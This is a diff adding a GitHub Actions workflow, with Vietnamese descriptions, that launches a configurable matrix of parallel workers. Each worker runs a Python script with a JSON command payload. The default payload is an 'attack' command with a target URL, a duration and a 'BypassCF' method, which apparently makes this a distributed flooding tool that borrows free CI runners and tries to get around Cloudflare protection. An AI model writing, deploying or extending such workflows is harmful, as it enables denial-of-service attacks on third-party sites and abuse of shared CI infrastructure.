@@ -1,0 +1,67 @@
+name: ga-worker
+
+on:
+  workflow_dispatch:
+    inputs:
+      count:
+        description: "Số worker (matrix)"
+        required: true
+        default: "5"
+      minutes:
+        description: "Mỗi worker chạy bao lâu (phút)"
+        required: true
+        default: "2"
+      parallel:
+        description: "Số job chạy đồng thời"
+        required: true
+        default: "5"
+      payload:
+        description: "JSON lệnh cho worker (vd attack/fetch/...)"
+        required: true
+        default: '{"cmd":"attack","args":{"target":"https://example.com","duration":60,"method":"BypassCF"}}'
+
+jobs:
+  make-matrix:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.set.outputs.matrix }}
+    steps:
+      - id: set
+        shell: bash
+        run: |
+          n=${{ inputs.count }}
+          printf 'matrix={"idx":[' > "$GITHUB_OUTPUT"
+          for i in $(seq 1 "$n"); do
+            if [ "$i" -gt 1 ]; then printf ',' >> "$GITHUB_OUTPUT"; fi
+            printf '%s' "$i" >> "$GITHUB_OUTPUT"
+          done
+          printf ']}\n' >> "$GITHUB_OUTPUT"
+
+  run-workers:
+    needs: make-matrix
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: ${{ fromJSON(inputs.parallel) }}
+      matrix: ${{ fromJSON(needs.make-matrix.outputs.matrix) }}
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: |
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+
+      - name: Run worker #${{ matrix.idx }}
+        env:
+          WORKER_ID: ${{ matrix.idx }}
+          PAYLOAD_JSON: ${{ inputs.payload }}
+        run: |
+          echo "START worker #${{ matrix.idx }}"
+          python3 vps_worker.py
+          sleep $(( ${{ inputs.minutes }} * 60 ))
+          echo "END worker #${{ matrix.idx }}"
